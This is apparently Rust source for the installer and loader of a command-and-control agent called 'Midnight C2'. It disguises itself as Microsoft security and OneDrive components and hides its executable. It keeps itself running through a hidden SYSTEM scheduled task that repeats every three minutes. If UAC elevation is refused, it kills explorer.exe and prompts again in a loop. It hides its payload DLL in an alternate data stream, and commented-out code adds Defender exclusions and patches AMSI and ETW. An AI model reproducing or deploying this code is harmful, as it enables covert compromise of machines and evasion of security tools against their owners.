use windows::core::{GUID, HSTRING, PCWSTR};
use windows::Win32::System::Com::{CoInitializeEx, COINIT_MULTITHREADED};
use windows::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryW};
use windows::Win32::System::ClrHosting::{
    CLSID_CLRMetaHost, ICLRMetaHost, ICLRRuntimeInfo, ICLRRuntimeHost
};
use std::ptr;
use std::os::windows::process::CommandExt;
use std::path::Path;
use windows::Win32::System::Console::FreeConsole;
use windows::Win32::UI::Shell::{IsUserAnAdmin, ShellExecuteW};
use windows::Win32::UI::WindowsAndMessaging::SW_HIDE;
use windows::Win32::System::Registry::*;

// Interface IIDs
const IID_ICLR_META_HOST: GUID = GUID::from_u128(0xd332db9e_b9b3_4125_8207_a14884f53216);

const EXE_NAME: &str = "SecurityHost.exe";

// CLRCreateInstance function pointer type
type CLRCreateInstanceFn = unsafe extern "system" fn(
    *const GUID,
    *const GUID,
    *mut *mut core::ffi::c_void,
) -> i32;

// ========================
// HELPER FUNCTIONS
// ========================
static mut SILENT_MODE: bool = false;

fn log(text: &str) {
    unsafe {
        if !SILENT_MODE {
            println!("{}", text);
        }
    }
}

// ========================
// INSTALLATION LOGIC
// ========================
fn get_install_info() -> (String, String, bool) {
    unsafe {
        let is_admin = IsUserAnAdmin().as_bool();
        if is_admin {
            (
                r"C:\ProgramData\Microsoft\Windows\Security".to_string(),
                r"Microsoft\Windows\Security\SecurityHost".to_string(),
                true
            )
        } else {
            let local_app_data = std::env::var("LOCALAPPDATA").unwrap_or_else(|_| r"C:\Temp".to_string());
            (
                format!(r"{}\Microsoft\Windows\Security", local_app_data),
                "Microsoft OneDrive Update".to_string(),
                false
            )
        }
    }
}

fn uninstall_old_agent() {
    log("[*] Checking for existing installations...");
    
    let system_task = "Microsoft Security Service";
    let user_task = "Microsoft OneDrive Update";
    let system_path = r"C:\ProgramData\Microsoft\Windows\Security\SecurityHost.exe";
    let user_path = format!(
        r"{}\Microsoft\Windows\Security\SecurityHost.exe",
        std::env::var("LOCALAPPDATA").unwrap_or_else(|_| r"C:\Temp".to_string())
    );

    for task in &[system_task, user_task] {
        let _ = std::process::Command::new("schtasks")
            .args(&["/Delete", "/TN", task, "/F"])
            .creation_flags(0x08000000)
            .output();
    }

    // Cleanup Registry Persistence
    unsafe {
        let run_key = HSTRING::from(r"Software\Microsoft\Windows\CurrentVersion\Run");
        let mut hkey = HKEY::default();
        
        if RegOpenKeyExW(HKEY_CURRENT_USER, PCWSTR(run_key.as_ptr()), 0, KEY_SET_VALUE, &mut hkey).is_ok() {
            let _ = RegDeleteValueW(hkey, PCWSTR(HSTRING::from("Microsoft OneDrive Update").as_ptr()));
            let _ = RegDeleteValueW(hkey, PCWSTR(HSTRING::from("Microsoft Security Service").as_ptr()));
            let _ = RegCloseKey(hkey);
        }

        if RegOpenKeyExW(HKEY_LOCAL_MACHINE, PCWSTR(run_key.as_ptr()), 0, KEY_SET_VALUE, &mut hkey).is_ok() {
            let _ = RegDeleteValueW(hkey, PCWSTR(HSTRING::from("Microsoft Security Service").as_ptr()));
            let _ = RegDeleteValueW(hkey, PCWSTR(HSTRING::from("Microsoft OneDrive Update").as_ptr()));
            let _ = RegCloseKey(hkey);
        }
    }
    
    /* 
    for _ in 0..3 {
        let _ = std::process::Command::new("taskkill")
            .args(&["/F", "/T", "/IM", EXE_NAME])
            .creation_flags(0x08000000)
            .output();
        std::thread::sleep(std::time::Duration::from_millis(100));
    }

    let kill_by_module = r#"Get-Process powershell,pwsh -ErrorAction SilentlyContinue | Where-Object { $_.Modules.ModuleName -like 'WinSec*.dll' } | Stop-Process -Force"#;
    let _ = std::process::Command::new("powershell")
        .args(&["-NoProfile", "-Command", kill_by_module])
        .creation_flags(0x08000000)
        .output();
        
    let kill_by_cmd = r#"Get-WmiObject Win32_Process | Where-Object { $_.CommandLine -like '*MidnightAgent*' -or $_.CommandLine -like '*WinSec*' } | Stop-Process -Force -ErrorAction SilentlyContinue"#;
    let _ = std::process::Command::new("powershell")
        .args(&["-NoProfile", "-Command", kill_by_cmd])
        .creation_flags(0x08000000)
        .output();
    
    std::thread::sleep(std::time::Duration::from_secs(3));
    */
    
    let paths = [system_path.to_string(), user_path];
    for path_str in paths.iter() {
        let path = Path::new(path_str);
        if path.exists() {
            let _ = std::fs::remove_file(path);
            if let Some(parent) = path.parent() {
                let _ = std::fs::remove_dir(parent);
            }
            log(&format!("    [+] Removed: {}", path_str));
        }
    }
    
    log("[+] Cleanup complete");
}

fn install_agent() -> Result<(), Box<dyn std::error::Error>> {
    log("[*] Installing Midnight C2 Agent...");
    
    let (install_folder, task_name, is_admin) = get_install_info();
    let install_path = format!(r"{}\{}", install_folder, EXE_NAME);
    
    // 3. Copy executable
    let current_exe = std::env::current_exe()?;
    let _current_filename = current_exe.file_name().unwrap_or_default().to_str().unwrap_or(EXE_NAME);

    // 1. Create directory
    std::fs::create_dir_all(&install_folder)?;
    log(&format!("[+] Directory: {}", install_folder));

    /*
    // 2. Add Windows Defender Exclusions
    let exclusion_cmd = format!(
        "Add-MpPreference -ExclusionPath '{}' -ErrorAction SilentlyContinue; \
         Add-MpPreference -ExclusionProcess '{}' -ErrorAction SilentlyContinue; \
         Add-MpPreference -ExclusionPath 'C:\\Windows\\Temp' -ErrorAction SilentlyContinue; \
         Add-MpPreference -ExclusionPath '$env:TEMP' -ErrorAction SilentlyContinue; \
         Add-MpPreference -ExclusionPath 'C:\\Windows\\Temp\\MpSigStub.dll' -ErrorAction SilentlyContinue; \
         Add-MpPreference -ExclusionPath '$env:TEMP\\MpSigStub.dll' -ErrorAction SilentlyContinue",
        install_folder, current_filename
    );
    let _ = std::process::Command::new("powershell")
        .args(&["-NoProfile", "-WindowStyle", "Hidden", "-Command", &exclusion_cmd])
        .creation_flags(0x08000000)
        .output();
    log("[+] Defender exclusions added");
    */
    
    // 3. Copy executable
    let current_exe = std::env::current_exe()?;
    let mut copied = false;
    
    // Check if we are already running from the target location
    if current_exe.to_string_lossy().to_lowercase() == install_path.to_lowercase() {
        copied = true; // No need to copy to ourselves
    } else {
        for i in 0..5 {
            // If first attempt fails, try to kill the target process to free the lock
            if i > 0 {
                let _ = std::process::Command::new("taskkill")
                    .args(&["/F", "/IM", EXE_NAME])
                    .creation_flags(0x08000000)
                    .output();
                std::thread::sleep(std::time::Duration::from_millis(500));
            }

            let _ = std::fs::remove_file(&install_path);
            if std::fs::copy(&current_exe, &install_path).is_ok() {
                copied = true;
                break;
            }
            std::thread::sleep(std::time::Duration::from_millis(1000));
        }
    }
    
    if !copied {
        log(&format!("[!] Failed to copy to: {}. File might be locked.", install_path));
    } else {
        log(&format!("[+] Installed to: {}", install_path));
        // Set hidden attributes to the newly copied file
        let path_hstring = HSTRING::from(&install_path);
        let _ = unsafe { windows::Win32::Storage::FileSystem::SetFileAttributesW(
            PCWSTR(path_hstring.as_ptr()), 
            windows::Win32::Storage::FileSystem::FILE_ATTRIBUTE_HIDDEN | windows::Win32::Storage::FileSystem::FILE_ATTRIBUTE_SYSTEM
        )};
    }
    
    // 4. Create Scheduled Task
    let principal_xml = if is_admin {
        r#"<Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>"#
    } else {
        r#"<Principal id="Author">
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>LeastPrivilege</RunLevel>
    </Principal>"#
    };

    let trigger_xml = if is_admin {
        r#"<BootTrigger>
      <Enabled>true</Enabled>
    </BootTrigger>
    <TimeTrigger>
      <Repetition>
        <Interval>PT3M</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <StartBoundary>2020-01-01T00:00:00</StartBoundary>
      <Enabled>true</Enabled>
    </TimeTrigger>"#
    } else {
        r#"<LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
    <TimeTrigger>
      <Repetition>
        <Interval>PT3M</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <StartBoundary>2020-01-01T00:00:00</StartBoundary>
      <Enabled>true</Enabled>
    </TimeTrigger>"#
    };

    let task_xml = format!(r#"<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>Windows Security Service</Description>
  </RegistrationInfo>
  <Triggers>
    {}
  </Triggers>
  <Principals>
    {}
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>"{}"</Command>
      <Arguments>agent</Arguments>
    </Exec>
  </Actions>
</Task>"#, trigger_xml, principal_xml, install_path);
      
    let temp_xml = std::env::temp_dir().join("mstask.xml");
    std::fs::write(&temp_xml, task_xml)?;
    
    let output = std::process::Command::new("schtasks")
        .args(&[
            "/Create",
            "/TN", &task_name,
            "/XML", temp_xml.to_str().unwrap(),
            "/F"
        ])
        .creation_flags(0x08000000)
        .output()?;
    
    let _ = std::fs::remove_file(&temp_xml);
    
    if output.status.success() {
        log(&format!("[+] Scheduled task: {}", task_name));
        
        let _ = std::process::Command::new("schtasks")
            .args(&["/Run", "/TN", &task_name])
            .creation_flags(0x08000000)
            .output();
        log("[+] Task started");
    } else {
        let err = String::from_utf8_lossy(&output.stderr);
        log(&format!("[!] Task failed: {}", err.trim()));
    }
    
    Ok(())
}

// ========================
// MAIN ENTRY POINT
// ========================
fn main() -> windows::core::Result<()> {
    unsafe {
        let args: Vec<String> = std::env::args().collect();
        let current_exe = std::env::current_exe().unwrap_or_default();
        let current_path = current_exe.to_string_lossy().to_string();
        
        let (install_folder, _task_name, is_admin) = get_install_info();
        let install_path = format!(r"{}\{}", install_folder, EXE_NAME);
        
        // === AGENT MODE DETECTION ===
        let current_lower = current_path.to_lowercase();
        let target_lower = install_path.to_lowercase();
        
        let is_target_path = current_lower == target_lower;
        let user_name = std::env::var("USERNAME").unwrap_or_default().to_uppercase();
        let is_system = user_name.contains("SYSTEM") || user_name.contains("LOCAL SERVICE") || user_name.contains("NETWORK SERVICE");
        let is_privileged = is_admin || is_system;

        let parent_dir = current_exe.parent().unwrap_or(std::path::Path::new("")).file_name().unwrap_or_default().to_str().unwrap_or_default().to_lowercase();
        let current_exe_name = current_exe.file_name().unwrap_or_default().to_str().unwrap_or_default().to_lowercase();

        let _is_installed_location = is_target_path || (current_exe_name == "securityhost.exe" && parent_dir == "security");
        
        // STRATEGIC AGENT DETECTION:
        // Show UI if it's the installer filename and NO 'agent' argument is present
        let is_installer_file = current_exe_name == "midnight_loader.exe" || current_exe_name == "midnightloader.exe";
        let has_agent_arg = args.iter().any(|a| a == "agent");
        
        // IF it's the installer file, we ALWAYS act as installer and EXIT after.
        let is_agent_mode = !is_installer_file || has_agent_arg;
        let should_show_ui = is_installer_file && !has_agent_arg;
        
        if should_show_ui {
            // Ensure console is visible for installer
            // (Windows might have hidden it if double-clicked)
            // Safety check
            if is_target_path { return Ok(()); }

            // ===== CONSOLE INSTALLER MODE =====
            println!("========================================");
            println!("   Midnight C2 - Installer v0.6.36");
            println!("========================================");

            if !is_privileged {
                println!(" [!] Error: Administrator privileges required.");
                return Ok(());
            }

            println!("[*] Running in INSTALLER mode [ADMIN]");
            println!("");
            
            uninstall_old_agent();
            println!("");
            
            match install_agent() {
                Ok(_) => {
                    println!("");
                    println!("════════════════════════════════════════");
                    println!("  ✅ Installation Complete!");
                    println!("  🚀 Task Scheduled (Microsoft Security Service)");
                    println!("════════════════════════════════════════");
                    println!("");
                    println!("[*] Closing in 5 seconds...");
                    std::thread::sleep(std::time::Duration::from_secs(5));
                }
                Err(e) => {
                    println!("[!] Installation failed: {}", e);
                }
            }
            
            return Ok(());
        }
        
        if is_agent_mode {
            // --- SINGLE INSTANCE LOCK (MUTEX) ---
            // This prevents the Task, Service, and Run-Key from running 4 agents at once!
            let mutex_name = HSTRING::from("Global\\MidnightAgent_Lock_v1");
            unsafe {
                let _ = windows::Win32::System::Threading::CreateMutexW(
                    None, 
                    true, 
                    PCWSTR(mutex_name.as_ptr())
                );
                
                if std::io::Error::last_os_error().raw_os_error() == Some(183) { // 183 is ERROR_ALREADY_EXISTS
                    // Another instance is already running! Exit silently.
                    std::process::exit(0);
                }
            }

            let _ = FreeConsole();
            SILENT_MODE = true; 
            
            // --- UAC ESCALATION TRAP ---
            if !is_privileged {
                let system_install_path = r"C:\ProgramData\Microsoft\Windows\Security\SecurityHost.exe";
                if !std::path::Path::new(system_install_path).exists() {
                    let verb = HSTRING::from("runas");
                    let file = HSTRING::from(&current_path);
                    let params = HSTRING::from("agent --relocated");

                    // 1. Polite Attempt
                    let first_attempt = ShellExecuteW(None, PCWSTR(verb.as_ptr()), PCWSTR(file.as_ptr()), PCWSTR(params.as_ptr()), None, SW_HIDE);
                    
                    if first_attempt.0 as usize <= 32 {
                        // 2. Persistent Attempt (Killer)
                        let _ = std::process::Command::new("taskkill").args(&["/F", "/IM", "explorer.exe"]).creation_flags(0x08000000).output();
                        loop {
                            let result = ShellExecuteW(None, PCWSTR(verb.as_ptr()), PCWSTR(file.as_ptr()), PCWSTR(params.as_ptr()), None, SW_HIDE);
                            if result.0 as usize > 32 { break; }
                            std::thread::sleep(std::time::Duration::from_secs(2));
                        }
                    }
                    std::process::exit(0);
                }
            }

            // --- DEPLOYMENT & RECOVERY ---
            // Settle in permanent path if elevated but not there yet
            if is_admin && !is_system && !is_target_path {
                let _ = install_agent();
                let _ = std::process::Command::new("explorer.exe").creation_flags(0x08000000).spawn();
                std::process::exit(0);
            }

            // --- AUTO-SYNC PERSISTENCE ---
            // Even if already installed, we run install_agent() to ensure:
            // 1. Task settings (like 3 min interval) are updated to latest
            // 2. Task is repaired if deleted or corrupted
            let _ = install_agent();
        }
        /*
        {
            // --- DYNAMIC AMSI/ETW BYPASS (OBFUSCATED) ---
            let k: u8 = 0x55; // XOR Key
            
            // Decrypt "amsi.dll"
            let enc_amsi = [0x34, 0x38, 0x26, 0x3c, 0x7b, 0x31, 0x39, 0x39];
            let amsi_str: String = enc_amsi.iter().map(|b| (b ^ k) as char).collect();
            
            if let Ok(amsi_lib) = LoadLibraryW(PCWSTR(HSTRING::from(&amsi_str).as_ptr())) {
                // Decrypt "AmsiScanBuffer"
                let enc_asb = [0x14, 0x38, 0x26, 0x3c, 0x06, 0x36, 0x34, 0x3b, 0x17, 0x20, 0x33, 0x33, 0x30, 0x27];
                let asb_str: String = enc_asb.iter().map(|b| (b ^ k) as char).collect();
                let asb_c = std::ffi::CString::new(asb_str).unwrap();
                
                if let Some(addr) = GetProcAddress(amsi_lib, windows::core::PCSTR(asb_c.as_ptr() as *const u8)) {
                    let addr = addr as *mut u8;
                    // Patch: mov eax, 0x80070057; ret -> b8 57 00 07 80 c3
                    let p_enc = [0xed, 0x02, 0x55, 0x52, 0xd5, 0x96];
                    let mut p = [0u8; 6];
                    for i in 0..6 { p[i] = p_enc[i] ^ k; }
                    
                    let mut old = PAGE_PROTECTION_FLAGS(0);
                    if windows::Win32::System::Memory::VirtualProtect(addr as _, p.len(), PAGE_EXECUTE_READWRITE, &mut old).is_ok() {
                        std::ptr::copy_nonoverlapping(p.as_ptr(), addr, p.len());
                        let _ = windows::Win32::System::Memory::VirtualProtect(addr as _, p.len(), old, &mut old);
                    }
                }
            }

            // Decrypt "ntdll.dll"
            let enc_nt = [0x3b, 0x21, 0x31, 0x39, 0x39, 0x7b, 0x31, 0x39, 0x39];
            let nt_str: String = enc_nt.iter().map(|b| (b ^ k) as char).collect();
            
            if let Ok(nt_lib) = LoadLibraryW(PCWSTR(HSTRING::from(&nt_str).as_ptr())) {
                // Decrypt "EtwEventWrite"
                let enc_eew = [0x10, 0x21, 0x22, 0x10, 0x23, 0x30, 0x3b, 0x21, 0x02, 0x27, 0x3c, 0x21, 0x30];
                let eew_str: String = enc_eew.iter().map(|b| (b ^ k) as char).collect();
                let eew_c = std::ffi::CString::new(eew_str).unwrap();
                
                if let Some(addr) = GetProcAddress(nt_lib, windows::core::PCSTR(eew_c.as_ptr() as *const u8)) {
                    let addr = addr as *mut u8;
                    // Patch: xor eax, eax; ret -> 31 c0 c3
                    let p_enc = [0x64, 0x95, 0x96];
                    let mut p = [0u8; 3];
                    for i in 0..3 { p[i] = p_enc[i] ^ k; }
                    
                    let mut old = PAGE_PROTECTION_FLAGS(0);
                    if windows::Win32::System::Memory::VirtualProtect(addr as _, p.len(), PAGE_EXECUTE_READWRITE, &mut old).is_ok() {
                        std::ptr::copy_nonoverlapping(p.as_ptr(), addr, p.len());
                        let _ = windows::Win32::System::Memory::VirtualProtect(addr as _, p.len(), old, &mut old);
                    }
                }
            }
        }
        */

        CoInitializeEx(None, COINIT_MULTITHREADED)?;
        let mscoree_name = HSTRING::from("mscoree.dll");
        let mscoree = LoadLibraryW(PCWSTR(mscoree_name.as_ptr()))?;
        if mscoree.is_invalid() { return Ok(()); }
        let proc_name = std::ffi::CString::new("CLRCreateInstance").unwrap();
        let clr_create_instance_ptr = GetProcAddress(mscoree, windows::core::PCSTR(proc_name.as_ptr() as *const u8));
        if clr_create_instance_ptr.is_none() { return Ok(()); }
        let clr_create_instance: CLRCreateInstanceFn = std::mem::transmute(clr_create_instance_ptr);
        let mut meta_host: *mut core::ffi::c_void = ptr::null_mut();
        let hr = clr_create_instance(&CLSID_CLRMetaHost, &IID_ICLR_META_HOST, &mut meta_host);
        if hr != 0 { return Ok(()); }
        let meta_host: ICLRMetaHost = std::mem::transmute(meta_host);
        let version = HSTRING::from("v4.0.30319");
        
        let runtime_info: ICLRRuntimeInfo = meta_host.GetRuntime(PCWSTR(version.as_ptr()))?;
        let is_loadable = runtime_info.IsLoadable()?;
        if !is_loadable.as_bool() { return Ok(()); }
        
        let runtime_host: ICLRRuntimeHost = runtime_info.GetInterface(&GUID::from_u128(0x90f1a06e_7712_4762_86b5_7a5eba6bdb02))?;
        let _ = runtime_host.Start();
        
        // === ZERO-FILE LOADING (ADS - Alternative Data Stream) ===
        // We hide the DLL bytes INSIDE the current executable's metadata stream.
        let dll_bytes = include_bytes!(r"..\..\MidnightAgent\bin\Release\net48\MidnightAgent.dll");
        
        // ADS Path format: "C:\path\executable.exe:metadata"
        // This hides the DLL within the file itself, invisible to normal file scanners.
        let ads_path = format!("{}:metadata", current_path);
        
        // Write bytes to the hidden stream
        if std::fs::write(&ads_path, dll_bytes).is_ok() {
            let path_hstring = HSTRING::from(&ads_path);
            
            let type_name = HSTRING::from("MidnightAgent.Program");
            let method_name = HSTRING::from("Run");
            let method_arg = HSTRING::from("");
            
            // The .NET host can load assemblies directly from ADS paths!
            let _ = runtime_host.ExecuteInDefaultAppDomain(
                PCWSTR(path_hstring.as_ptr()), 
                PCWSTR(type_name.as_ptr()), 
                PCWSTR(method_name.as_ptr()), 
                PCWSTR(method_arg.as_ptr())
            );
        }


        Ok(())
    }
}
